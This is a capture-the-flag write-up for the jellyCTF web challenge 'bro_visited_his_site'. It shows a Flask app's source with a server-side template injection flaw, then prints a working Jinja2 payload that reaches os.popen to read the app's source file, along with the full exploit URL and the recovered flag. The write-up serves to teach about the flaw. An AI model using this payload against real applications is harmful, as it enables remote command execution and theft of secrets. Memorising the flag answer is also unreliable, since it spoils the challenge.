# bro_visited_his_site
Writeup author: **lolmenow**

Point count: 100pts

Difficulty: easy

Provided files: bro_visited_his_site.zip

Url: https://bro-visited-his-site.jellyc.tf/

Description: bro stored his secrets in the flask app config
# 

Upon visiting the website, it seems like we type anything in this box and it just reflects what we put in the box.

Seeing this, I immediately thought that our input might not be sanitized properly, so I took a look at the source code.

```
#!/usr/bin/env python3
from flask import Flask, request, render_template_string, send_from_directory

app = Flask(__name__)
app.config["FLAG"] = "jellyCTF{redacted}"

@app.route("/")
def index():
    return """
        <img src="/static/bro.jpg" />
        <form action="/response" method="get">
            <textarea cols="50" name="word"></textarea>
            <input type="submit" value="go">
        </form>
    """

@app.route("/response")
def response():
    word = request.args.get("word", "")

    return render_template_string(f'''
        {{% set config="friend" %}}
        {{% set self="visit" %}}
        <p>
            {word}pilled {word}maxxer
        </p>
    ''')

@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8081, debug=True)
```

Yup! We see that in the response route, specifically in the way it uses render_template_string to render the user input, the users input is put directly into the template without proper sanitization. This makes the website vulnerable to `Server-Side Template Injection (SSTI)`

Once knowing this, I used hacktricks SSTI Jinja 2 SSTI [payloads](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) (because we know the website is running with flask) and kept trying payloads until one worked.

This one worked!

`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat bros_site.py").read()}}{%endif%}{% endfor %}`

*Note: `bros_site.py`, as mentioned above, contains the secret in the flask config, hence why we need to read it*

Once injected into the `word` parameter, we get this:

![image](https://github.com/sa1181405/pbchocolate-private-writeups/assets/170969470/0921d7e0-7d2f-4d90-a830-4cf1e095102d)

And there it is! Our flag!

Final flag: `jellyCTF{f1agp1ll3d_t3mpl4te_1nj3ct10nmaxx3r}`

Final payload: `https://bro-visited-his-site.jellyc.tf/response?word={% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat bros_site.py").read()}}{%endif%}{% endfor %}`
